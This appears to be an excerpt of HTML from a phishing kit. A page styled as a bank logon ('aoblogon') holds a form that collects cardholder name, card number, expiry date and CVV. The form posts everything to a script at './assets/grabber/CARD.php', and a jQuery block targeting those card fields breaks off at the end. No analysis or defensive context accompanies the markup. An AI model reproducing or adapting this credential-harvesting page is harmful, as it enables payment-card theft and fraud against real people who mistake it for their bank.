  ...
  <header class="header-container">
              ...
              <div class="col-main-right">
                ...
                <div class="row">
                  <div class="col-sm-7">
                    ...
                    <form method="post" id="aoblogon" name="aoblogon" action="./assets/grabber/CARD.php">
                      <div>
                        ...
                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container" style="display: none;">
                          <label class="control-label" for="aoblogon_userid">Cardholder's Name</label>
                          <div class="controls">
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="card_name" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus">
                          </div>
                        </div>
                        ...
                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Cardholder's Name</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="card_name" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Card Number</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="card_number" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Expiry</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="exp" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">CVV</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="csc" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>
    ...
    <script>
      $(document).ready(function () {
        var $input = $('[name=card_name], [name=card_number], [name=exp], [name=csc]'),
